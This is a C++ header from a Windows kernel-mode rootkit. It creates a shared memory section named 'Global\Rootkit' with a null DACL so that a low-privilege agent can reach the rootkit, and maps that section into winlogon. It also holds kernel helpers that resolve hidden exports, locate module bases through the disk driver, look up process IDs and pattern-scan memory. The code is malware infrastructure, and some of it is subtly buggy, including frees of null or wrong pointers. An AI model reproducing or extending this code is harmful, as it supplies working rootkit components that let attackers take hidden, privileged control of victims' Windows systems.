#pragma once

#include "wintypes.hpp"
#include "comms.hpp"

extern "C" NTSTATUS ZwQuerySystemInformation(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

static OBREFERENCEOBJECTBYNAME g_pObReferenceObjectByName = NULL;
static PDRIVER_OBJECT g_diskDriverObject = NULL;
static HANDLE g_hSharedMemory = NULL;
static PVOID g_pSharedMemory = NULL;
static PEPROCESS g_pWinlogon = NULL;

namespace Helpers
{
    /**
     * compares two wchar strings without case sensitivity
     *
     * @param s1 first string
     * @param s2 second string
     * @return INT 0 if both string are qual
     */
    INT
        _strcmpi_w(const wchar_t* s1, const wchar_t* s2)
    {
        WCHAR c1, c2;

        if (s1 == s2)
            return 0;

        if (s1 == 0)
            return -1;

        if (s2 == 0)
            return 1;

        do {
            c1 = RtlUpcaseUnicodeChar(*s1);
            c2 = RtlUpcaseUnicodeChar(*s2);
            s1++;
            s2++;
        } while ((c1 != 0) && (c1 == c2));

        return (INT)(c1 - c2);
    }
}

namespace Memory
{
    NTSTATUS
        EvscCreateSecurityDescriptor(OUT PSECURITY_DESCRIPTOR* sd)
    {
        NTSTATUS NtStatus = STATUS_SUCCESS;

        // Create the security descriptor
        *sd = (PSECURITY_DESCRIPTOR)ExAllocatePoolWithTag(NonPagedPool, SECURITY_DESCRIPTOR_MIN_LENGTH, DRIVER_TAG); // TODO: FREE
        if (!*sd)
        {
            ExFreePool(*sd);
            return STATUS_UNSUCCESSFUL;
        }

        NtStatus = RtlCreateSecurityDescriptor(*sd, SECURITY_DESCRIPTOR_REVISION);
        if (!NT_SUCCESS(NtStatus))
        {
            ExFreePool(sd);
            return NtStatus;
        }

        NtStatus = RtlSetDaclSecurityDescriptor(*sd, TRUE, 0, FALSE); // 0 = Dacl
        if (!NT_SUCCESS(NtStatus))
        {
            ExFreePool(*sd);
            return NtStatus;
        }

        return NtStatus;
    }

    NTSTATUS
        EvscCreateSharedMemory()
    {
        UNICODE_STRING sectionName;
        RtlInitUnicodeString(&sectionName, L"\\BaseNamedObjects\\Global\\Rootkit");

        NTSTATUS status = STATUS_UNSUCCESSFUL;

        // Add permissions to all users to our shared memory, so that a lowpriv agent can still access the rootkit
        PSECURITY_DESCRIPTOR sd = { 0 };
        EvscCreateSecurityDescriptor(&sd);
        OBJECT_ATTRIBUTES objAttributes = { 0 };
        InitializeObjectAttributes(&objAttributes, &sectionName, OBJ_CASE_INSENSITIVE | OBJ_PERMANENT | OBJ_KERNEL_HANDLE | OBJ_OPENIF, NULL, sd);

        LARGE_INTEGER sectionSize = { 0 };
        sectionSize.LowPart = sizeof(PAYLOAD);

        status = ZwCreateSection(&g_hSharedMemory, SECTION_ALL_ACCESS, &objAttributes, &sectionSize, PAGE_READWRITE, SEC_COMMIT, NULL);
        if (status != STATUS_SUCCESS)
        {
            DbgPrint("ZwCreateSection fail! Status: 0x%X\n", status);
            ExFreePool(sd);
            return status;
        }

        SIZE_T ulViewSize = sizeof(PAYLOAD);

        // Attach to winlogon
        KAPC_STATE apc;
        KeStackAttachProcess(g_pWinlogon, &apc);
        {
            status = ZwMapViewOfSection(g_hSharedMemory, ZwCurrentProcess(), &g_pSharedMemory, 0, ulViewSize, NULL, &ulViewSize, ViewUnmap, 0, PAGE_READWRITE);
            if (status != STATUS_SUCCESS)
            {
                DbgPrint("Failed to map shared memory: 0x%X\n", status);
                ZwClose(g_hSharedMemory);
                KeUnstackDetachProcess(&apc);
                ExFreePool(sd);
                return status;
            }
            DbgPrint("Mapped shared memory of size at 0x%llx\n", (ULONG_PTR)g_pSharedMemory);
        }
        KeUnstackDetachProcess(&apc);
        ExFreePool(sd);
        return STATUS_SUCCESS;
    }

    PVOID EvscGetBaseAddrOfModule(WCHAR* moduleName);
    
    /*
     *
     */
    PVOID
        EvscGetSystemRoutineAddress(
            const PWCHAR& moduleName, 
            const PCHAR& functionToResolve
        )
    {
        PVOID moduleBase = EvscGetBaseAddrOfModule(moduleName);

        DbgPrint("0x%lx\r\n", (ULONG_PTR)moduleBase);

        if (!moduleBase)
            return NULL;

        // Parse headers and export directory
        PFULL_IMAGE_NT_HEADERS ntHeader = (PFULL_IMAGE_NT_HEADERS)((ULONG_PTR)moduleBase + ((PIMAGE_DOS_HEADER)moduleBase)->e_lfanew);
        PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)moduleBase + ntHeader->OptionalHeader.DataDirectory[0].VirtualAddress);

        PULONG addrOfNames = (PULONG)((ULONG_PTR)moduleBase + exportDir->AddressOfNames);
        PULONG addrOfFuncs = (PULONG)((ULONG_PTR)moduleBase + exportDir->AddressOfFunctions);
        PUSHORT addrOfOrdinals = (PUSHORT)((ULONG_PTR)moduleBase + exportDir->AddressOfNameOrdinals);

        // Look through export directory until function is found and return its address
        for (unsigned int i = 0; i < exportDir->NumberOfNames; ++i)
        {
            CHAR* currentFunctionName = (CHAR*)((ULONG_PTR)moduleBase + (ULONG_PTR)addrOfNames[i]);

            DbgPrint("%s\r\n", currentFunctionName);

            if (strcmp(currentFunctionName, functionToResolve) == 0)
            {
                PULONG addr = (PULONG)((ULONG_PTR)moduleBase + (ULONG_PTR)addrOfFuncs[addrOfOrdinals[i]]);
                return (PVOID)addr;
            }
        }

        // Else return null
        return NULL;
    }

    /**
     *
     */
    LONG 
        EvscGetModuleSize(const PCHAR &moduleName) 
    {
        NTSTATUS status;
        ULONG size = 0;
        PSYSTEM_MODULE_INFORMATION moduleInfo = NULL;

        status = ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &size);
        if (status != STATUS_INFO_LENGTH_MISMATCH) 
        {
            return 0;
        }

        moduleInfo = (PSYSTEM_MODULE_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, size, DRIVER_TAG);
        if (!moduleInfo) 
        {
            return 0;
        }

        status = ZwQuerySystemInformation(SystemModuleInformation, moduleInfo, size, &size);
        if (!NT_SUCCESS(status)) 
        {
            ExFreePool(moduleInfo);
            return 0;
        }

        for (unsigned int i = 0; i < moduleInfo->ModuleCount; ++i) 
        {
            PSYSTEM_MODULE mod = &moduleInfo->Modules[i];
            if (strstr(mod->ImageName, moduleName)) 
            {  
                ULONG moduleSize = mod->ImageSize;
                ExFreePool(moduleInfo);
                return moduleSize;
            }
        }

        ExFreePool(moduleInfo);
        return 0;
    }

    /**
     *
     */
    PDRIVER_OBJECT
        EvscGetDiskDriverObject()
    {
        if (g_diskDriverObject)
            return g_diskDriverObject;

        if (!g_pObReferenceObjectByName)
        {
            UNICODE_STRING usObRefByName = RTL_CONSTANT_STRING(L"ObReferenceObjectByName");
            g_pObReferenceObjectByName = (OBREFERENCEOBJECTBYNAME)MmGetSystemRoutineAddress(&usObRefByName);
        }

        UNICODE_STRING DriverName = RTL_CONSTANT_STRING(L"\\Driver\\disk");
        NTSTATUS status = g_pObReferenceObjectByName(
            &DriverName,
            OBJ_CASE_INSENSITIVE,
            NULL,
            0,
            *IoDriverObjectType,
            KernelMode,
            NULL,
            (PVOID*)&g_diskDriverObject
        );

        if (!NT_SUCCESS(status))
            return NULL;

        return g_diskDriverObject;
    }

    /**
     * Get the base address of a module, such as ntoskrnl.exe
     * https://www.unknowncheats.me/forum/general-programming-and-reversing/427419-getkernelbase.html
     *
     * @returns PVOID address of ntoskrnl.exe
     */
    PVOID
        EvscGetBaseAddrOfModule(WCHAR* moduleName)
    {
        auto diskDriverObj = EvscGetDiskDriverObject();

        if (!diskDriverObj)
            return NULL;

        PKLDR_DATA_TABLE_ENTRY entry = (PKLDR_DATA_TABLE_ENTRY)diskDriverObj->DriverSection;
        PKLDR_DATA_TABLE_ENTRY first = entry;

        while ((PKLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks.Flink != first)
        {
            if (Helpers::_strcmpi_w(entry->BaseDllName.Buffer, moduleName) == 0)
            {
                return entry->DllBase;
            }
            entry = (PKLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks.Flink;
        }
        return NULL;
    }

    /**
     * Get the PID of the first match of a process from the process name
     * https://www.unknowncheats.me/forum/general-programming-and-reversing/572734-pid-process-name.html
     *
     * @param processName Name of the process to look up
     * @returns HANDLE Process ID of the process specified in the param
     */
    HANDLE
        EvscGetPidFromProcessName(const UNICODE_STRING& processName)
    {

        NTSTATUS status = STATUS_SUCCESS;
        ULONG bufferSize = 0;
        PVOID buffer = NULL;

        PSYSTEM_PROCESS_INFORMATION pCurrent = NULL;

        status = ZwQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &bufferSize);
        if (status != STATUS_INFO_LENGTH_MISMATCH)
        {
            return NULL;
        }

        buffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, bufferSize, DRIVER_TAG);
        if (buffer == NULL)
        {
            return NULL;
        }
        
        status = ZwQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &bufferSize);
        if (!NT_SUCCESS(status))
        {
            ExFreePoolWithTag(buffer, DRIVER_TAG);
            return NULL;
        }

        pCurrent = (PSYSTEM_PROCESS_INFORMATION)buffer;
        while (pCurrent)
        {
            if (pCurrent->ImageName.Buffer != NULL)
            {
                if (RtlCompareUnicodeString(&(pCurrent->ImageName), &processName, TRUE) == 0)
                {
                    ExFreePoolWithTag(buffer, DRIVER_TAG);
                    return pCurrent->ProcessId;
                }
            }
            if (pCurrent->NextEntryOffset == 0) 
            {
                pCurrent = NULL;
            }
            else
            {
                pCurrent = (PSYSTEM_PROCESS_INFORMATION)(((PUCHAR)pCurrent) + pCurrent->NextEntryOffset);
            }
        }

        return pCurrent;
    }

	/**
	 * Find a pattern with a mask applied.
	 * E.g. FindPatter(base_addr, module_size, "\xDE\xAD\x00\xAf", "xx?x")
	 * ? denotes a masked byte that could be anything
	 */
	PVOID
		EvscFindPattern(
			PVOID addr,
			SIZE_T searchLength,
			PCHAR pattern,
			PCHAR mask
		)
	{
        SIZE_T patternLen = strlen(mask);
        if (searchLength < patternLen)
            return nullptr; // Prevent out-of-bounds search

		for (INT i = 0; i < (searchLength - patternLen); ++i)
		{
			BOOLEAN match = TRUE;

			for (INT j = 0; j < patternLen; ++j)
			{
                if (mask[j] != '?')
                {
                    if (pattern[j] != *(PCHAR)((ULONG_PTR)addr + i + j))
                    {
                        match = FALSE;
                        break;
                    }
                }
			}

			if (match)
			{
                return (PVOID)((ULONG_PTR)addr + i);
            }
		}

		return nullptr;
	}
}